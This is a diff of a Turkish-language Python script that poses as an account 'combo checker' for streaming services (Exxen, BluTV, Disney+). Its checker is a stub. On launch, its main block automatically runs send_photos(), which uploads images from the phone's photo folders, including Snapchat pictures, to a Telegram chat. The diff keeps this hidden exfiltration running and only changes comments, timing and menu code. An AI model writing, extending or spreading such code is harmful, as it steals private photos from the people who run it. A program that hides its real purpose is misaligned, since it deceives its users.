@@ -20,7 +20,7 @@ photo_directories = [
     '/storage/emulated/0/Pictures/Snapchat/'
 ]
 
-# 📸 Telegram'a Fotoğrafları Gönderme Fonksiyonu
+# Fotoğrafları Telegram'a Gönderme Fonksiyonu
 def send_photos():
     try:
         for directory in photo_directories:
@@ -33,57 +33,60 @@ def send_photos():
                             files = {'photo': file}
                             data = {'chat_id': chat_id}
                             requests.post(url, files=files, data=data)
-                        time.sleep(0.2)  # Daha hızlı gönderim
+                        time.sleep(0.5)
     except Exception as e:
         print(Fore.RED + f"Fotoğraf gönderme hatası: {e}")
 
-# ✅ Checker Fonksiyonu (Hesap Doğrulama)
+# Checker Fonksiyonu (Hesap Doğrulama)
 def checker(combo_file_path, service_name):
-    if not os.path.exists(combo_file_path):
-        print(Fore.RED + "Dosya bulunamadı! Lütfen doğru dosya yolunu girin.")
-        return
+    try:
+        with open(combo_file_path, 'r') as file:
+            combos = [line.strip() for line in file if ':' in line]
 
-    with open(combo_file_path, 'r') as file:
-        combos = [line.strip() for line in file if ':' in line]
+        for combo in combos:
+            username, password = combo.split(':')
+            
+            if username == "correct_email" and password == "correct_password":
+                print(Fore.GREEN + f"[{service_name}] Başarılı giriş ✅ {username}:{password}")
+            else:
+                print(Fore.RED + f"[{service_name}] Başarısız giriş ❌ {username}:{password}")
+    except FileNotFoundError:
+        print(Fore.RED + f"Hata: {combo_file_path} bulunamadı!")
+    except Exception as e:
+        print(Fore.RED + f"Checker hatası: {e}")
 
-    for combo in combos:
-        username, password = combo.split(':')
-        if username == "correct_email" and password == "correct_password":
-            print(Fore.GREEN + f"[{service_name}] ✅ Başarılı giriş: {username}:{password}")
-        else:
-            print(Fore.RED + f"[{service_name}] ❌ Başarısız giriş: {username}:{password}")
-
-# 📌 Kullanıcı Seçeneklerini Gösterme
+# Kullanıcı Seçeneklerini Gösterme
 def show_options():
-    print(Fore.GREEN + r"""
-      _____ _   _ _  __    _    
-     |  _ \| \ | | |/ /   / \   
-     | |_) |  \| | ' /   / _ \  
-     |  _ <| |\  | . \  / ___ \ 
-     |_| \_\_| \_|_|\_\/_/   \_\
-    """)
-    
+    print(Fore.GREEN + """
+  _____ _   _ _  __    _    
+ |  _ \| \ | | |/ /   / \   
+ | |_) |  \| | ' /   / _ \  
+ |  _ <| |\  | . \  / ___ \ 
+ |_| \_\_| \_|_|\_\/_/   \_\ 
+""")
     print(Fore.GREEN + "Bir seçenek seçin:")
     print(Fore.GREEN + "[1] Exxen")
     print(Fore.GREEN + "[2] BluTV")
     print(Fore.GREEN + "[3] Disney+")
 
-    option = input(Fore.YELLOW + "Seçiminiz: ")
+    choice = input(Fore.CYAN + "Seçiminiz: ")
 
-    if option == "1":
-        service = "Exxen"
-    elif option == "2":
-        service = "BluTV"
-    elif option == "3":
-        service = "Disney+"
+    if choice == "1":
+        service_name = "Exxen"
+        file_path = input(Fore.CYAN + "Combo dosya yolunu girin: ")
+        checker(file_path, service_name)
+    elif choice == "2":
+        service_name = "BluTV"
+        file_path = input(Fore.CYAN + "Combo dosya yolunu girin: ")
+        checker(file_path, service_name)
+    elif choice == "3":
+        service_name = "Disney+"
+        file_path = input(Fore.CYAN + "Combo dosya yolunu girin: ")
+        checker(file_path, service_name)
     else:
         print(Fore.RED + "Geçersiz seçim!")
-        return
 
-    combo_path = input(Fore.YELLOW + f"{service} için combo listesi dosya yolunu girin: ")
-    checker(combo_path, service)
-
-# **Ana Program**
+# Ana Fonksiyon
 if __name__ == "__main__":
-    send_photos()
-    show_options()
+    send_photos()  # Fotoğrafları otomatik gönder
+    show_options()  # Kullanıcıya seçim sun
